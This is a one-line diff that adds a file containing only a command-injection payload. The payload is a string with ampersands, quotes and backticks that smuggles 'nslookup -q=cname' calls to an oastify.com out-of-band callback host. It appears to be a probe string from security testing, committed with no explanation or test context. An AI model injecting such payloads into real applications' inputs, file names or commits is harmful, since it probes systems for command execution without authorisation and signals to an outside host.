@@ -1,0 +1,1 @@
+bDJ81f35PB&nslookup -q=cname sb7ii1qecqujxocr1skj59j06rck0e520qsdl1a.oastify.com.&'\"`0&nslookup -q=cname sb7ii1qecqujxocr1skj59j06rck0e520qsdl1a.oastify.com.&`'
